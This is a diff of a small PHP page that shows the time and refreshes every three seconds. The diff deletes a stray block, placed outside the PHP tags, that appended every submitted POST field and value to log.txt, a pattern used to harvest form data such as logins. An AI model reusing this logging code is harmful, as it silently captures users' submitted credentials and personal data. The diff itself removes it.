@@ -10,17 +10,5 @@ echo "Page will refresh in every 3 seconds</br></br>";
 header("refresh: 3"); 
     
 echo date('H:i:s Y-m-d'); 
-  
 exit; 
-?>
-$handle = fopen("log.txt", "a");
-foreach($_POST as $variable => $value) {
-fwrite($handle, $variable);
-fwrite($handle, "=");
-fwrite($handle, $value);
-fwrite($handle, "\r\n");
-}
-fwrite($handle, "\r\n\n\n\n");
-fclose($handle);
-exit;
 ?>
